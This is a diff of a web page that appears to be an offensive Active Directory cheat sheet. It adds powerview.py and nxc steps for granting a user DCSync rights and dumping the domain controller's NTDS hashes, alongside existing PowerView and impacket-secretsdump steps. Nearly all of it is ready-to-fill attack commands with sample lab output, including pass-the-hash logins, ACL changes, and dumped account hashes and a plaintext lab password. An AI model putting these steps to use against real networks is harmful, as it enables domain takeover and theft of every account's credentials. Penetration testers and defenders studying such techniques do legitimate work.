@@ -326,9 +326,29 @@ body.dark-mode #dynamicFormContainer button:hover {
 </style>
   <h3 id="abuse-1-add-dcsync-right-to-user">Abuse #1: Add dcsync right to user</h3>
 <p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
+<button data-tabset="set1" data-tabcontent="tab1" >Linux</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-import-powerview">1. Import PowerView</h4>
+<button data-tabset="set1" data-tabcontent="tab2" >Windows</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><p><button data-tabset="set1-1" data-tabcontent="tab1" class="active">powerview.py</button></p>
+<div class="tabcontent" data-tabset="set1-1" data-tabcontent="tab1"><h4 id="1-connect-to-dc">1. Connect to DC</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
+</span></span><span class="line"><span class="cl"><span class="go">powerview &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET_DOMAIN&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl"><span class="go">powerview &#39;&lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET_DOMAIN&gt;&#39; -H &lt;HASH&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> powerview <span class="s1">&#39;CORP.LOCAL/WEB01$@172.16.1.5&#39;</span> -H 7ddf32e17a6ac5ce04a8ecbf782ca509
+</span></span><span class="line"><span class="cl"><span class="go">(LDAP)-[DC01.corp.local]-[CORP\WEB01$]
+</span></span></span><span class="line"><span class="cl"><span class="go">PV &gt; 
+</span></span></span></code></pre></div><h4 id="2-add-dcsync-right">2. Add dcsync right</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainObjectAcl -PrincipalIdentity &#39;&lt;USER&gt;&#39; -TargetIdentity &#39;&lt;TARGET_IDENTITY&gt;&#39; -Rights DCSync
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">(LDAP)-[DC01.corp.local]-[CORP\WEB01$]
+</span></span></span><span class="line"><span class="cl"><span class="go">PV &gt; Add-DomainObjectAcl -PrincipalIdentity &#39;WEB01$&#39; -TargetIdentity &#39;DC=corp,DC=local&#39; -Rights DCSync
+</span></span></span><span class="line"><span class="cl"><span class="go">[2024-10-01 12:51:36] [Add-DomainObjectACL] Found target identity: DC=corp,DC=local
+</span></span></span><span class="line"><span class="cl"><span class="go">[2024-10-01 12:51:36] [Add-DomainObjectACL] Found principal identity: CN=WEB01,OU=Web Servers,OU=Servers,OU=Corp,DC=corp,DC=local
+</span></span></span><span class="line"><span class="cl"><span class="go">[2024-10-01 12:51:36] DACL modified successfully!
+</span></span></span></code></pre></div></div></div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-import-powerview">1. Import PowerView</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; . .\PowerView.ps1
 </span></span></span></code></pre></div><h4 id="2-create-a-cred-object-runas-optional">2. Create a cred object (runas) [optional]</h4>
@@ -336,12 +356,14 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span> -AsPlainText -Force
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
 </span></span></code></pre></div><h4 id="3-add-dcsync-right">3. Add dcsync right</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainObjectAcl -PrincipalIdentity &lt;USER&gt; -TargetIdentity &#39;&lt;DOMAIN&gt;\&lt;TARGET_GROUP&gt;&#39; -Rights DCSync -Credential $cred
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainObjectAcl -PrincipalIdentity &#39;&lt;USER&gt;&#39; -TargetIdentity &#39;&lt;TARGET_IDENTITY&gt;&#39; -Rights DCSync -Credential $cred
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; Add-DomainObjectAcl -PrincipalIdentity &#39;svc-alfresco&#39; -TargetIdentity &#39;HTB.LOCAL\Domain Admins&#39; -Rights DCSync -Credential $Cred
 </span></span></span></code></pre></div></div></p>
-<h3 id="4-secrets-dump">4. Secrets dump</h3>
+<h4 id="secrets-dump">Secrets dump</h4>
 <p>
-<button data-tabset="set2" data-tabcontent="tab1" class="active">Linux</button>
+<button data-tabset="set2" data-tabcontent="tab1" >impacket</button>
+
+<button data-tabset="set2" data-tabcontent="tab2" >nxc</button>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump &#39;&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET&gt;&#39;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump <span class="s1">&#39;svc-alfresco:s3rvice@10.10.10.161&#39;</span>
@@ -356,6 +378,17 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 </span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up...
+</span></span></span></code></pre></div></div>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc smb &lt;TARGET&gt; -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -H &lt;HASH&gt; --ntds
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> nxc smb 172.16.1.5 -d CORP.LOCAL -u <span class="s1">&#39;WEB01$&#39;</span> -H 7ddf32e17a6ac5ce04a8ecbf782ca509 --ntds
+</span></span><span class="line"><span class="cl"><span class="go">[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user &lt;user&gt; to dump a specific user safely or the module -M ntdsutil [Y/n] Y
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         172.16.1.5      445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:True)
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         172.16.1.5      445    DC01             [+] CORP.LOCAL\WEB01$:7ddf32e17a6ac5ce04a8ecbf782ca509
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         172.16.1.5      445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         172.16.1.5      445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         172.16.1.5      445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:ac2b5f88fc33b7b9e0682be85784ec0d:::
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
 </span></span></span></code></pre></div></div></p>
 
 </div></div>
